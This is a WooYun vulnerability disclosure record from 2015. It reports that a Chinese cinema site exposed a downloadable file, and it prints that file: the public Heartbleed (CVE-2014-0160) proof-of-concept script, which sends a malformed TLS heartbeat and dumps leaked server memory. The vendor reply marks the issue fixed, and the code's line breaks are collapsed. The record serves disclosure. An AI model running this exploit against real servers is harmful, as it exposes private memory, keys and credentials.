{"id": 29356, "wybug_id": "wooyun-2015-0119653", "wybug_title": "玩主影院服务器配置不当导致敏感信息泄露", "wybug_corp": "北京新空气软件技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-11 11:08", "wybug_open_date": "2015-06-15 09:23", "wybug_type": "应用配置错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： RT 详细说明：  http://m.funguide.com.cn/openssl.py m.funguide.com.cn直接上脚本：\n#!/usr/bin/python# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.import sysimport structimport socketimport timeimport selectimport refrom optparse import OptionParseroptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')def h2bin(x):    return x.replace(' ', '').replace('\\n', '').decode('hex')hello = h2bin('''16 03 02 00  dc 01 00 00 d8 03 02 5343 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15  00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 0000 0f 00 01 01                                  ''')hb = h2bin(''' 18 03 02 00 0301 40 00''')def hexdump(s):    for b in xrange(0, len(s), 16):        lin = [c for c in s[b : b + 16]]        hxdat = ' '.join('%02X' % ord(c) for c in lin)        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)        print '  %04x: %-48s %s' % (b, hxdat, pdat)    printdef recvall(s, length, timeout=5):    endtime = time.time() + timeout    rdata = ''    remain = length    while remain > 0:        rtime = endtime - time.time()         if rtime < 0:            return None        r, w, e = select.select([s], [], [], 5)        if s in r:            data = s.recv(remain)            # EOF?            if not data:                return None            rdata += data            remain -= len(data)    return rdata        def recvmsg(s):    hdr = recvall(s, 5)    if hdr is None:        print 'Unexpected EOF receiving record header - server closed connection'        return None, None, None    typ, ver, ln = struct.unpack('>BHH', hdr)    pay = recvall(s, ln, 10)    if pay is None:        print 'Unexpected EOF receiving record payload - server closed connection'        return None, None, None    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))    return typ, ver, paydef hit_hb(s):    s.send(hb)    while True:        typ, ver, pay = recvmsg(s)        if typ is None:            print 'No heartbeat response received, server likely not vulnerable'            return False        if typ == 24:            print 'Received heartbeat response:'            hexdump(pay)            if len(pay) > 3:                print 'WARNING: server returned more data than it should - server is vulnerable!'            else:                print 'Server processed malformed heartbeat, but did not return any extra data.'            return True        if typ == 21:            print 'Received alert:'            hexdump(pay)            print 'Server returned error, likely not vulnerable'            return Falsedef main():    opts, args = options.parse_args()    if len(args) < 1:        options.print_help()        return    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    print 'Connecting...'    sys.stdout.flush()    s.connect((args[0], opts.port))    print 'Sending Client Hello...'    sys.stdout.flush()    s.send(hello)    print 'Waiting for Server Hello...'    sys.stdout.flush()    while True:        typ, ver, pay = recvmsg(s)        if typ == None:            print 'Server closed connection without sending Server Hello.'            return        # Look for server hello done message.        if typ == 22 and ord(pay[0]) == 0x0E:            break    print 'Sending heartbeat request...'    sys.stdout.flush()    s.send(hb)    hit_hb(s)if __name__ == '__main__':    main()\n   漏洞证明：  综上   修复方案：  你会   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-06-11 11:11 厂商回复： 感谢白帽 最新状态： 2015-06-15：已经修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}